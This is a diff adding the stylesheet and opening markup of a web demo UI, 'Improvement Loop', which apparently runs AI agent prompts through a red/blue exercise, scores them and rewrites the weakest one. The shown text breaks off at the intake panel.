@@ -1,0 +1,3050 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IMPROVEMENT LOOP — LIVE</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#020208;--bp:#05050f;--bi:#08081a;
+  --amb:#ffbc00;--ad:#8a6200;--am:#d09800;
+  --grn:#00f090;--red:#ff3355;--blu:#4fc3f7;
+  --wht:#e8e8f8;--gr:#7878a0;--bdr:#10101e;
+  --gr-a:0 0 12px rgba(255,188,0,.45);
+  --gr-g:0 0 12px rgba(0,240,144,.45);
+  --gr-r:0 0 12px rgba(255,51,85,.45);
+  --gr-b:0 0 12px rgba(79,195,247,.35);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow:hidden}
+body{background:var(--bg);color:var(--wht);font-family:'Share Tech Mono','Courier New',monospace;font-size:14px;display:flex;flex-direction:column}
+body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.055) 3px,rgba(0,0,0,.055) 4px)}
+
+/* Banner */
+.banner{background:var(--amb);color:#000;text-align:center;padding:4px;font-family:'Orbitron',sans-serif;font-weight:900;font-size:11px;letter-spacing:4px;flex-shrink:0}
+
+/* Header */
+.hdr{display:flex;justify-content:space-between;align-items:center;padding:9px 16px;border-bottom:1px solid var(--bdr);background:linear-gradient(180deg,rgba(255,188,0,.04),transparent);flex-shrink:0}
+.ht{font-family:'Orbitron',sans-serif;font-weight:900;font-size:17px;letter-spacing:3px;color:var(--amb);text-shadow:var(--gr-a)}
+.hs{font-size:10px;color:var(--am);letter-spacing:2px;margin-top:2px}
+.hcyc{font-family:'Orbitron',sans-serif;font-size:13px;color:var(--amb);letter-spacing:2px;text-shadow:var(--gr-a)}
+
+/* Phase bar */
+.pbar{display:flex;border-bottom:1px solid var(--bdr);background:var(--bp);flex-shrink:0}
+.eph{flex:1;padding:5px 2px;text-align:center;font-size:12px;letter-spacing:1px;color:var(--gr);border-right:1px solid var(--bdr);transition:all .3s;line-height:1.5}
+.eph:last-child{border-right:none}
+.eph .epn{display:block;font-size:10px;color:#606090;margin-bottom:1px}
+.eph.active{color:var(--amb);text-shadow:var(--gr-a);background:rgba(255,188,0,.025)}
+.eph.active .epn{color:var(--ad)}
+.eph.done{color:var(--grn);background:rgba(0,240,144,.015)}
+.eph.done .epn{color:#004d26}
+
+/* Main content area */
+.main{flex:1;min-height:0;overflow:hidden;display:flex;flex-direction:column}
+
+/* Phase panels */
+.phase-panel{display:none;flex:1;min-height:0;overflow:hidden;flex-direction:column}
+.phase-panel.active{display:flex}
+
+/* Mode select */
+.mode-select{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:24px;padding:30px}
+.mode-title{font-family:'Orbitron',sans-serif;font-size:11px;letter-spacing:3px;color:var(--gr);margin-bottom:8px}
+.mode-btns{display:flex;gap:20px;align-items:stretch}
+.mode-btn{flex:1;min-width:200px;background:var(--bp);border:2px solid var(--gr);color:var(--gr);font-family:'Orbitron',sans-serif;font-size:12px;letter-spacing:2px;padding:24px 20px;cursor:pointer;transition:all .3s;text-align:center;display:flex;flex-direction:column;gap:8px}
+.mode-btn:hover{border-color:var(--am);color:var(--amb);background:rgba(255,188,0,.04)}
+.mode-btn.import-ready{border-color:var(--amb);color:var(--amb);box-shadow:var(--gr-a)}
+.mode-btn.import-dim{opacity:.5}
+.mode-icon{font-size:28px;display:block}
+.mode-desc{font-family:'Share Tech Mono',monospace;font-size:10px;letter-spacing:1px;color:#5858a0;line-height:1.6;margin-top:4px;font-weight:normal}
+
+/* Intake panel */
+.intake-wrap{flex:1;overflow-y:auto;padding:16px 20px;display:flex;flex-direction:column;gap:14px;min-height:0}
+.intake-hdr{font-family:'Orbitron',sans-serif;font-size:11px;letter-spacing:3px;color:var(--amb);padding-bottom:8px;border-bottom:1px solid var(--bdr)}
+
+/* Preset swarm selector */
+.swarm-toggle{display:flex;gap:0;margin-bottom:10px}
+.swtb{background:var(--bi);border:1px solid var(--bdr);color:var(--gr);font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:2px;padding:8px 22px;cursor:pointer;transition:all .2s}
+.swtb:hover{border-color:var(--am);color:var(--amb)}
+.swtb.sel-red{border-color:var(--red);color:var(--red);background:rgba(255,51,85,.06)}
+.swtb.sel-blue{border-color:var(--blu);color:var(--blu);background:rgba(79,195,247,.06)}
+
+/* Agent cards */
+.agent-list{display:flex;flex-direction:column;gap:6px}
+.agent-card{display:flex;align-items:center;gap:12px;padding:8px 12px;background:var(--bp);border:1px solid var(--bdr);font-size:11px}
+.agent-name{font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:1.5px;color:var(--amb);min-width:160px}
+.agent-role{color:#7070a0}
+
+/* Custom form */
+.custom-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;flex:1}
+.form-label{font-size:9px;letter-spacing:2px;color:var(--am);display:block;margin-bottom:4px}
+.form-ta{width:100%;background:var(--bi);border:1px solid var(--bdr);border-bottom-color:var(--gr);color:var(--wht);font-family:'Share Tech Mono',monospace;font-size:11px;padding:7px 9px;outline:none;resize:none;height:90px;line-height:1.6}
+.form-ta:focus{border-color:var(--am)}
+.agent-slots{display:flex;flex-direction:column;gap:8px}
+.agent-slot{border:1px solid var(--bdr);background:var(--bp)}
+.slot-hdr{display:flex;align-items:center;justify-content:space-between;padding:6px 10px;font-size:10px;letter-spacing:1.5px;color:var(--am);cursor:pointer;border-bottom:1px solid var(--bdr)}
+.slot-body{padding:8px;display:flex;flex-direction:column;gap:6px}
+.slot-body.hidden{display:none}
+.form-inp{width:100%;background:var(--bi);border:1px solid var(--bdr);border-bottom-color:var(--gr);color:var(--amb);font-family:'Share Tech Mono',monospace;font-size:11px;padding:5px 8px;outline:none}
+.form-inp:focus{border-color:var(--am)}
+.add-slot-btn{background:transparent;border:1px dashed var(--gr);color:var(--gr);font-family:'Share Tech Mono',monospace;font-size:10px;letter-spacing:1px;padding:6px 14px;cursor:pointer;transition:all .2s;width:100%;margin-top:4px}
+.add-slot-btn:hover{border-color:var(--am);color:var(--am)}
+
+/* Chain import card */
+.import-card{background:var(--bp);border:1px solid var(--amb);padding:14px;border-radius:0}
+.import-card-hdr{font-family:'Orbitron',sans-serif;font-size:12px;letter-spacing:2px;color:var(--amb);margin-bottom:10px;text-shadow:var(--gr-a)}
+.import-scores{display:flex;gap:10px;margin-bottom:10px}
+.score-badge{padding:4px 12px;font-family:'Orbitron',sans-serif;font-size:11px;letter-spacing:1px}
+.score-badge.red{background:rgba(255,51,85,.12);border:1px solid var(--red);color:var(--red)}
+.score-badge.blue{background:rgba(79,195,247,.12);border:1px solid var(--blu);color:var(--blu)}
+.import-table{width:100%;border-collapse:collapse;font-size:11px;margin-bottom:10px}
+.import-table th{text-align:left;padding:4px 8px;font-size:9px;letter-spacing:1.5px;color:var(--gr);border-bottom:1px solid var(--bdr)}
+.import-table td{padding:4px 8px;border-bottom:1px solid var(--bdr)}
+.outcome-pass{color:var(--grn)}
+.outcome-partial{color:var(--amb)}
+.outcome-fail{color:var(--red)}
+.import-agents{font-size:11px;color:#7070a0;margin-top:6px}
+
+/* Begin button */
+.begin-btn{background:transparent;border:2px solid var(--amb);color:var(--amb);font-family:'Orbitron',sans-serif;font-weight:700;font-size:13px;letter-spacing:2px;padding:12px 32px;cursor:pointer;box-shadow:var(--gr-a);transition:all .3s;align-self:flex-start;margin-top:8px}
+.begin-btn:hover{background:rgba(255,188,0,.08)}
+.begin-btn:disabled{border-color:var(--gr);color:var(--gr);cursor:not-allowed;box-shadow:none}
+
+/* Exercise panel */
+.exercise-wrap{flex:1;overflow:hidden;display:flex;flex-direction:column;min-height:0}
+.ex-split{display:grid;grid-template-columns:1fr 1px 1fr;flex:1;min-height:0;overflow:hidden}
+.ex-div{background:linear-gradient(180deg,var(--red),var(--blu));opacity:.35}
+.ex-pane{display:flex;flex-direction:column;overflow:hidden;min-height:0}
+.ex-ptb{display:flex;align-items:center;justify-content:space-between;padding:7px 14px;border-bottom:1px solid var(--bdr);flex-shrink:0}
+.ex-ptitle{font-size:10.5px;letter-spacing:2px}
+.ex-ptitle.red{color:#e04060}
+.ex-ptitle.blue{color:var(--blu)}
+.terminal{flex:1;overflow-y:auto;padding:13px;line-height:1.9;min-height:0;font-size:14px}
+.terminal.single{flex:1;overflow-y:auto;padding:13px;line-height:1.9;min-height:0;font-size:14px;width:100%}
+.ts-line{color:#5050a0;font-size:11px}
+.ts-line::before{content:'// '}
+.te{margin:8px 0}
+.te-hdr{font-size:10.5px;letter-spacing:1.5px;margin-bottom:4px;display:flex;align-items:center;gap:6px}
+.te-hdr::before{content:'▶';font-size:8.5px;opacity:.6}
+.te-hdr.red{color:var(--red)}
+.te-hdr.blue{color:var(--blu)}
+.te-hdr.amber{color:var(--amb)}
+.te-body{white-space:pre-wrap;padding:6px 0 6px 12px;font-size:14px;line-height:1.8}
+.te-body.red{border-left:2px solid rgba(255,51,85,.4);color:#f0c8c8}
+.te-body.blue{border-left:2px solid rgba(79,195,247,.4);color:#c0daf0}
+.te-body.amber{border-left:2px solid rgba(255,188,0,.4);color:#f0e0a0}
+
+/* Arbiter panel */
+.arbiter-wrap{flex:1;overflow-y:auto;padding:16px 20px;display:flex;flex-direction:column;gap:12px;min-height:0}
+.arbiter-hdr{font-family:'Orbitron',sans-serif;font-size:13px;letter-spacing:3px;color:var(--amb);text-shadow:var(--gr-a);padding-bottom:8px;border-bottom:1px solid var(--bdr)}
+.arbiter-content{white-space:pre-wrap;font-size:12px;line-height:1.85;color:var(--wht)}
+.score-table{width:100%;border-collapse:collapse;font-size:11px;margin:8px 0}
+.score-table th{text-align:left;padding:5px 8px;font-size:9px;letter-spacing:1.5px;color:var(--gr);border-bottom:1px solid var(--bdr)}
+.score-table td{padding:5px 8px;border-bottom:1px solid var(--bdr)}
+.score-hi{color:var(--grn)}
+.score-mid{color:var(--amb)}
+.score-lo{color:var(--red)}
+.weakest-box{border:1px solid var(--red);background:rgba(255,51,85,.05);padding:10px 14px;animation:weakPulse 2.5s ease-in-out infinite}
+@keyframes weakPulse{0%,100%{box-shadow:0 0 6px rgba(255,51,85,.2)}50%{box-shadow:0 0 18px rgba(255,51,85,.5)}}
+.weakest-label{font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:2px;color:var(--red);margin-bottom:6px}
+.aggregate-score{font-family:'Orbitron',sans-serif;font-size:28px;color:var(--amb);text-shadow:var(--gr-a);text-align:center;padding:10px 0;animation:aggPulse 1s ease-out}
+@keyframes aggPulse{0%{opacity:0;transform:scale(.8)}100%{opacity:1;transform:scale(1)}}
+
+/* Sculptor diff panel */
+.sculptor-wrap{flex:1;overflow:hidden;display:flex;flex-direction:column;min-height:0}
+.sculptor-grid{display:grid;grid-template-columns:30% 20% 50%;flex:1;min-height:0;overflow:hidden}
+.diff-pane{display:flex;flex-direction:column;overflow:hidden;min-height:0;border-right:1px solid var(--bdr)}
+.diff-pane:last-child{border-right:none}
+.diff-hdr{padding:7px 12px;font-size:9.5px;letter-spacing:2px;border-bottom:1px solid var(--bdr);flex-shrink:0;background:var(--bp)}
+.diff-hdr.before{color:#e04060}
+.diff-hdr.center{color:var(--amb);text-align:center}
+.diff-hdr.after{color:var(--grn)}
+.diff-body{flex:1;overflow-y:auto;padding:10px 12px;font-size:11px;line-height:1.8;white-space:pre-wrap}
+.diff-line{display:block;padding:1px 0}
+.diff-line.added{background:rgba(240,165,0,.12)}
+.diff-line.removed{text-decoration:line-through;opacity:.45}
+.manifest-cards{display:flex;flex-direction:column;gap:8px;padding:10px}
+.manifest-card{padding:8px 10px;border:1px solid var(--bdr);font-size:11px;opacity:0;transition:opacity .4s}
+.manifest-card.visible{opacity:1}
+.manifest-badge{font-family:'Orbitron',sans-serif;font-size:8px;letter-spacing:2px;padding:2px 6px;margin-bottom:4px;display:inline-block}
+.badge-added{background:rgba(0,240,144,.12);border:1px solid var(--grn);color:var(--grn)}
+.badge-removed{background:rgba(255,51,85,.12);border:1px solid var(--red);color:var(--red)}
+.badge-tightened{background:rgba(255,188,0,.12);border:1px solid var(--amb);color:var(--amb)}
+.badge-clarified{background:rgba(79,195,247,.12);border:1px solid var(--blu);color:var(--blu)}
+.sculptor-analyzing{text-align:center;padding:20px;color:var(--amb);font-size:11px;animation:blink .9s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.25}}
+
+/* Rerun panel */
+.rerun-wrap{flex:1;overflow:hidden;display:flex;flex-direction:column;min-height:0}
+.rerun-split{display:grid;grid-template-columns:1fr 1fr;border-bottom:1px solid var(--bdr);flex:1;min-height:0;overflow:hidden}
+.rerun-pane{display:flex;flex-direction:column;overflow:hidden;min-height:0;border-right:1px solid var(--bdr)}
+.rerun-pane:last-child{border-right:none}
+.rerun-phdr{padding:6px 12px;font-size:10px;letter-spacing:2px;border-bottom:1px solid var(--bdr);flex-shrink:0;background:var(--bp)}
+.rerun-phdr.r1{color:var(--gr)}
+.rerun-phdr.r2{color:var(--grn)}
+.rerun-bottom{flex-shrink:0;padding:12px 20px;background:var(--bp);border-top:1px solid var(--bdr);max-height:180px;overflow-y:auto}
+.score-bars{display:flex;flex-direction:column;gap:8px;margin-bottom:10px}
+.score-bar-row{display:flex;align-items:center;gap:10px;font-size:11px}
+.score-bar-label{width:120px;color:var(--gr);font-size:10px}
+.score-bar-track{flex:1;height:8px;background:var(--bi);border:1px solid var(--bdr);position:relative}
+.score-bar-fill{height:100%;transition:width .8s ease-out}
+.score-bar-fill.before{background:var(--gr)}
+.score-bar-fill.after{background:var(--grn)}
+.score-bar-val{width:40px;text-align:right;font-family:'Orbitron',sans-serif;font-size:10px}
+.delta-val{color:var(--grn);font-size:10px;width:35px}
+.verdict-box{text-align:center;padding:8px 0}
+.verdict-text{font-family:'Orbitron',sans-serif;font-size:22px;letter-spacing:4px}
+.blind-box{border:1px solid rgba(0,240,144,.45);background:rgba(0,240,144,.04);padding:10px 12px;margin-bottom:10px}
+.blind-hdr{font-family:'Orbitron',sans-serif;font-size:11px;letter-spacing:.08em;color:var(--grn);margin-bottom:6px}
+.blind-note{font-size:10px;line-height:1.5;opacity:.75;margin-bottom:8px}
+.blind-row{display:flex;gap:10px;font-size:10px;padding:2px 0;border-top:1px solid rgba(255,255,255,.06)}
+.blind-k{flex:0 0 190px;opacity:.7}
+.blind-v{flex:1;font-family:'Orbitron',sans-serif}
+.blind-hi{color:var(--grn)}.blind-lo{color:var(--red)}.blind-eq{color:var(--amb)}.blind-unp{color:var(--red)}
+.blind-warn{margin-top:8px;font-size:10px;color:var(--amb);border-left:2px solid var(--amb);padding-left:8px}
+.selfgrade-label{font-size:10px;opacity:.7;margin:10px 0 4px;border-left:2px solid rgba(255,255,255,.25);padding-left:8px}
+.verdict-improved{color:var(--grn);text-shadow:var(--gr-g)}
+.verdict-marginal{color:var(--amb);text-shadow:var(--gr-a)}
+.verdict-regression{color:var(--red);text-shadow:var(--gr-r)}
+
+/* Export panel */
+.export-panel{display:none;border-top:2px solid var(--amb);background:var(--bp);padding:14px 20px;flex-shrink:0}
+.export-panel.show{display:flex;gap:12px;align-items:center;flex-wrap:wrap}
+.export-btn{background:transparent;border:1px solid var(--amb);color:var(--amb);font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:1.5px;padding:8px 16px;cursor:pointer;transition:all .3s}
+.export-btn:hover{background:rgba(255,188,0,.07)}
+.export-btn.done{border-color:var(--grn);color:var(--grn)}
+.export-cycle-btn{background:transparent;border:1px solid var(--grn);color:var(--grn);font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:1.5px;padding:8px 16px;cursor:pointer;transition:all .3s}
+.export-cycle-btn:hover{background:rgba(0,240,144,.07)}
+.export-copy-btn{background:transparent;border:1px solid var(--blu);color:var(--blu);font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:1.5px;padding:8px 16px;cursor:pointer;transition:all .3s}
+.export-copy-btn:hover{background:rgba(79,195,247,.07)}
+.export-dl-btn{background:transparent;border:1px solid var(--wht);color:var(--wht);font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:1.5px;padding:8px 16px;cursor:pointer;transition:all .3s}
+.export-dl-btn:hover{background:rgba(255,255,255,.06)}
+.export-dl-btn.done{border-color:var(--grn);color:var(--grn)}
+.combat-link{margin-left:auto;color:var(--gr);font-size:10px;letter-spacing:1px;text-decoration:none;border:1px solid var(--gr);padding:7px 12px;transition:all .2s}
+.combat-link:hover{border-color:var(--am);color:var(--am)}
+
+/* Step gate */
+.step-gate{margin:14px 0;text-align:center;padding:8px 0;border-top:1px solid rgba(255,255,255,.07);border-bottom:1px solid rgba(255,255,255,.07)}
+.step-btn{background:transparent;font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:2px;padding:10px 28px;cursor:pointer;border:1px solid var(--amb);color:var(--amb);transition:all .2s}
+.step-btn:hover{background:rgba(255,188,0,.07);box-shadow:var(--gr-a)}
+
+/* Bottom bar */
+.btm{display:flex;flex-direction:column;flex-wrap:nowrap;padding:0;gap:0;border-top:1px solid var(--bdr);flex-shrink:0}
+.btm-row{display:flex;align-items:center;gap:10px;padding:7px 16px;flex-wrap:nowrap}
+.btm-config{border-bottom:1px solid var(--bdr);background:var(--bp);overflow-x:auto}
+.btm-actions{background:color-mix(in srgb,var(--bp) 80%,var(--bg) 20%)}
+/* Error recovery banner */
+/* Tier notice spans — class-based size so pmode can override */
+.tier-note{font-size:10px}
+body.pmode .tier-note{font-size:12px}
+#error-recovery-banner{background:rgba(255,51,85,.08);border:1px solid var(--red);padding:10px 16px;margin:8px;align-items:center;gap:12px;flex-wrap:wrap;flex-shrink:0}
+#error-recovery-banner .err-msg{font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--red);flex:1}
+#error-recovery-banner button{background:transparent;font-family:'Share Tech Mono',monospace;font-size:10px;letter-spacing:1px;padding:5px 10px;cursor:pointer}
+.phase-recovery{background:rgba(255,180,0,.08);border:1px solid var(--amb);padding:10px 14px;margin:6px;border-radius:2px;z-index:50;position:relative}
+.phase-recovery-hdr{font-family:'Orbitron',sans-serif;font-size:11px;color:var(--amb);letter-spacing:2px;margin-bottom:4px}
+
+.phase-recovery-cls{font-family:'Orbitron',sans-serif;font-size:11px;letter-spacing:2px;margin-bottom:3px;word-break:break-word}
+.phase-recovery-sub{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--amb);opacity:.9;margin-bottom:4px;word-break:break-word}
+.phase-recovery-msg{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--amb);opacity:.85;margin-bottom:8px;word-break:break-word}
+.phase-recovery-btns{display:flex;gap:6px;flex-wrap:wrap}
+.phase-recovery-btns button{background:transparent;border:1px solid var(--amb);color:var(--amb);font-family:'Share Tech Mono',monospace;font-size:9.5px;letter-spacing:1px;padding:4px 8px;cursor:pointer}
+.phase-recovery-btns button:hover{background:rgba(255,180,0,.18)}
+.phase-recovery-btns .prv-cont{border-color:var(--grn);color:var(--grn)}
+.phase-recovery-btns .prv-cont:hover{background:rgba(0,240,144,.15)}
+.phase-recovery-btns .prv-skip{border-color:#5050a0;color:#7878a0}
+.phase-recovery-btns .prv-dismiss{border-color:var(--red);color:var(--red)}
+.phase-recovery-btns .prv-dismiss:hover{background:rgba(255,51,85,.15)}
+.startbtn{background:transparent;font-family:'Orbitron',sans-serif;font-weight:700;font-size:12px;letter-spacing:2px;padding:9px 18px;cursor:pointer;transition:all .3s;border:2px solid}
+.go-btn{border-color:var(--amb);color:var(--amb);box-shadow:var(--gr-a)}
+.go-btn:hover:not(:disabled){background:rgba(255,188,0,.08)}
+.rst-btn{border-color:var(--gr);color:var(--gr)}
+.rst-btn:hover{background:rgba(64,64,106,.12)}
+.startbtn:disabled{border-color:var(--gr);color:var(--gr);cursor:not-allowed;box-shadow:none}
+.bsep{width:1px;height:30px;background:var(--bdr)}
+.live-toggle{background:transparent;font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:1px;padding:7px 13px;cursor:pointer;transition:all .3s;border:1px solid var(--gr);color:var(--gr)}
+.live-toggle.active{border-color:var(--grn);color:var(--grn);box-shadow:var(--gr-g)}
+.live-toggle#demo-btn.active{border-color:var(--blu);color:var(--blu);background:rgba(79,195,247,.06);box-shadow:none;text-shadow:0 0 8px rgba(79,195,247,.4)}
+.live-toggle:hover:not(.active){border-color:#6060a0;color:#8080c0}
+.prv-mini{background:transparent;font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:1px;padding:5px 9px;cursor:pointer;border:1px solid var(--gr);color:var(--gr);transition:all .2s;white-space:nowrap}
+.prv-mini.sel{border-color:var(--amb);color:var(--amb);background:rgba(255,188,0,.06)}
+.prv-mini:hover:not(.sel){border-color:#6060a0;color:#8080c0}
+.apifield{background:var(--bi);border:1px solid var(--bdr);color:var(--amb);font-family:'Share Tech Mono',monospace;font-size:11px;padding:5px 9px;outline:none;width:230px}
+.apifield:focus{border-color:var(--gr)}
+.mdl-inp{background:var(--bi);border:1px solid var(--bdr);color:var(--amb);font-family:'Share Tech Mono',monospace;font-size:10px;padding:4px 7px;outline:none;width:200px;display:none}
+.mdl-inp:focus{border-color:var(--gr)}
+.kconf-btm{font-size:10px;letter-spacing:1px;color:var(--gr);border:1px solid var(--gr);padding:5px 12px;display:inline-flex;align-items:center;gap:8px;white-space:nowrap}
+.kc-clear{cursor:pointer;opacity:.5;font-size:12px;line-height:1}.kc-clear:hover{opacity:1}
+.binfo{font-size:10.5px;color:#5858a0}
+::-webkit-scrollbar{width:3px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--gr)}
+/* PRESENTATION MODE — optimized for projector. Toggle: Ctrl+P or body.classList.toggle('pmode') */
+body.pmode::after{display:none}
+body.pmode{font-size:15px}
+body.pmode .ph,body.pmode .eph,body.pmode .phase{font-size:13px;letter-spacing:.5px;padding:7px 4px}
+body.pmode .ph .pn,body.pmode .eph .epn,body.pmode .phase .pn{font-size:11px}
+body.pmode .sh{font-size:12px}
+body.pmode label{font-size:11px}
+body.pmode .ht{font-size:22px}
+body.pmode .hs{font-size:13px}
+body.pmode .bt{font-size:19px}
+body.pmode .bts{font-size:13px}
+body.pmode .term,body.pmode .terminal{font-size:15px;line-height:2.0}
+body.pmode .tc{font-size:14.5px}
+body.pmode .ts,body.pmode .ts-line{font-size:13px}
+body.pmode .tah{font-size:13px}
+body.pmode .te-hdr{font-size:13px}
+body.pmode .te-body{font-size:14px;line-height:2.0}
+body.pmode .ibtn,body.pmode .startbtn,body.pmode .begin-btn{font-size:15px;padding:13px 20px;letter-spacing:3px}
+body.pmode .demo-btn,body.pmode .live-toggle,body.pmode .mode-toggle{font-size:12px;padding:9px 15px}
+body.pmode .prvbtn,body.pmode .prv-mini{font-size:12px;padding:7px 11px}
+body.pmode .srow{font-size:13px}
+body.pmode .st,body.pmode .ss{font-size:12px}
+body.pmode .binfo{font-size:13px}
+body.pmode .ttl{font-size:13px}
+body.pmode .ptitle,body.pmode .pstat{font-size:13px}
+body.pmode .siem-hdr{font-size:13px;padding:7px 14px}
+body.pmode .ar{font-size:13px}
+body.pmode .ati{font-size:11px}
+body.pmode input[type=password],body.pmode textarea,body.pmode .apifield{font-size:13px}
+/* Contrast uplift — forge */
+body.pmode .ph{color:#7878b8}
+body.pmode .ph.active{color:var(--g)}
+body.pmode .ph.done{color:var(--a)}
+body.pmode .ph .pn{color:#9090c0}
+body.pmode .hr{color:#9898c8}
+body.pmode .ts{color:#9090d8}
+body.pmode .ati{color:#9090c0}
+body.pmode .rf{color:#8888b0}
+body.pmode .prvbtn{color:#8888b8;border-color:#8888b8}
+body.pmode .demo-btn{color:#9090c8;border-color:#7070a0;opacity:0.85}
+/* Contrast uplift — combat */
+body.pmode .phase{color:#7878b8}
+body.pmode .phase .pn{color:#7878b8}
+body.pmode .binfo{color:#8888c8}
+body.pmode .st{color:#8080d0}
+body.pmode .live-toggle{color:#8080aa;border-color:#8080aa}
+body.pmode .prv-mini{color:#8888b8;border-color:#8888b8}
+/* Contrast uplift — evolve */
+body.pmode .eph{color:#7878b8}
+body.pmode .eph .epn{color:#9090c0}
+body.pmode .mode-desc{color:#8888c8}
+body.pmode .agent-role{color:#9090c0}
+body.pmode .agent-name{font-size:12px}
+body.pmode .diff-hdr{font-size:12px;padding:9px 14px}
+/* Touch targets */
+body.pmode .prvbtn,body.pmode .prv-mini,body.pmode .live-toggle,body.pmode .demo-btn{min-height:36px}
+body.pmode .ibtn,body.pmode .startbtn,body.pmode .begin-btn{min-height:48px}
+/* RESPONSIVE. Tablet-first; phone is best-effort with DEMO MODE prioritized. */
+@media (max-width:1024px){
+  .custom-grid{grid-template-columns:1fr;gap:10px}
+  .ex-split{grid-template-columns:1fr;grid-template-rows:1fr 1fr;overflow:auto}
+  .ex-div{display:none}
+  .sculptor-grid{grid-template-columns:1fr;grid-template-rows:auto auto auto;overflow:auto}
+  .rerun-split{grid-template-columns:1fr;grid-template-rows:1fr 1fr;overflow:auto}
+  .btm-config{flex-wrap:wrap}
+}
+@media (max-width:768px){
+  body.pmode{font-size:13px}
+  .eph{font-size:10.5px;padding:5px 2px}
+  body.pmode .eph{font-size:11px;padding:5px 3px}
+  .eph .epn{font-size:8.5px}
+  body.pmode .eph .epn{font-size:9px}
+  body.pmode .terminal,.terminal{font-size:12px;line-height:1.7}
+  body.pmode .te-body,.te-body{font-size:12px;line-height:1.7}
+  .btm-row{flex-wrap:wrap;padding:6px 10px;gap:6px}
+  .ht{font-size:16px;letter-spacing:1px}
+  .hs{font-size:9px}
+  .hr{flex-wrap:wrap;gap:6px;font-size:9px}
+}
+@media (max-width:375px){
+  .ht{font-size:13px;letter-spacing:.5px}
+  .hs{display:none}
+  body{font-size:12px}
+  body.pmode{font-size:12px}
+  .eph{font-size:8.5px;padding:3px 1px}
+  body.pmode .eph{font-size:9px}
+  .eph .epn{font-size:7px}
+  .demo-btn,.mode-toggle{font-size:10px;padding:7px 8px}
+}
+@media (pointer:coarse){
+  .prvbtn,.prv-mini,.live-toggle,.demo-btn,.swb{min-height:44px;min-width:44px}
+  .ibtn,.startbtn,.begin-btn{min-height:56px}
+  .ibtn{font-size:16px}
+}
+</style>
+</head>
+<body class="pmode">
+
+<div class="banner">TOP SECRET // IMPROVEMENT LOOP LIVE // SELF-REFINEMENT DEMO</div>
+
+<div class="hdr">
+  <div>
+    <div class="ht">◆ IMPROVEMENT LOOP — LIVE</div>
+    <div class="hs">AUTONOMOUS IMPROVEMENT LOOP // SELF-REFINEMENT DEMONSTRATION</div>
+  </div>
+  <div class="hcyc" id="cycle-counter">CYCLE 1 / ∞</div>
+  <span id="tok-count" style="display:none;font-size:9px;color:var(--grn);letter-spacing:1px;border:1px solid var(--grn);padding:1px 5px;margin-left:8px;font-variant-numeric:tabular-nums">tokens: 0 ▌</span>
+</div>
+
+<div class="pbar">
+  <div class="eph" id="eph0" title="Phase 0: MODE SELECT — Choose evolution input source (preset agent, custom, or chained from combat)"><span class="epn">P0</span>MODE SELECT</div>
+  <div class="eph" id="eph1" title="Phase 1: INTAKE — Load the target agent prompt and exercise context"><span class="epn">P1</span>INTAKE</div>
+  <div class="eph" id="eph2" title="Phase 2: EXERCISE — Run the agent through a benchmark scenario to surface weaknesses"><span class="epn">P2</span>EXERCISE</div>
+  <div class="eph" id="eph3" title="Phase 3: ARBITER — Independent evaluator scores the agent's performance and identifies failure modes"><span class="epn">P3</span>ARBITER</div>
+  <div class="eph" id="eph4" title="Phase 4: SCULPTOR — Refine the prompt to address arbiter findings"><span class="epn">P4</span>SCULPTOR</div>
+  <div class="eph" id="eph5" title="Phase 5: RERUN — Replay the exercise with the refined prompt; compare to baseline"><span class="epn">P5</span>RERUN</div>
+</div>
+
+<div id="error-recovery-banner" style="display:none">
+  <span class="err-msg">⚠ API error encountered. How do you want to proceed?</span>
+  <button id="err-retry-btn" style="border:1px solid var(--red);color:var(--red)">[ RETRY ]</button>
+  <button id="err-demo-btn" style="border:1px solid var(--amb);color:var(--amb)">[ SWITCH TO DEMO MODE ]</button>
+  <button id="err-dismiss-btn" style="border:1px solid var(--gr);color:var(--gr)">[ DISMISS ]</button>
+</div>
+
+<div class="main">
+
+  <!-- PHASE 0: MODE SELECT -->
+  <div class="phase-panel" id="pp-0">
+    <div class="mode-select">
+      <div class="mode-title">SELECT OPERATING MODE</div>
+      <div class="mode-btns">
+        <button class="mode-btn" onclick="selectMode('preset')">
+          <span class="mode-icon">⚔</span>
+          <span>PRESET MODE</span>
+          <span class="mode-desc">Pre-built red and blue rosters drive a CCDC-style exercise. The weakest performer gets rewritten. Full demo without an API key.</span>
+        </button>
+        <button class="mode-btn" onclick="selectMode('custom')">
+          <span class="mode-icon">⚛</span>
+          <span>CUSTOM MODE</span>
+          <span class="mode-desc">Paste up to three of your own agent prompts. CHALLENGER designs a domain-fit stress test against them, then the loop runs.</span>
+        </button>
+        <button class="mode-btn" id="import-mode-btn" onclick="selectMode('import')">
+          <span class="mode-icon">⬅</span>
+          <span>IMPORT MODE</span>
+          <span class="mode-desc">Pulls a completed exercise out of localStorage from the CAGE demo and evolves the weakest agent against it — closing the build → fight → refine loop.</span>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 1: INTAKE -->
+  <div class="phase-panel" id="pp-1">
+    <!-- PRESET sub-mode -->
+    <div id="intake-preset" style="display:none;flex:1;flex-direction:column;overflow:hidden">
+      <div class="intake-wrap">
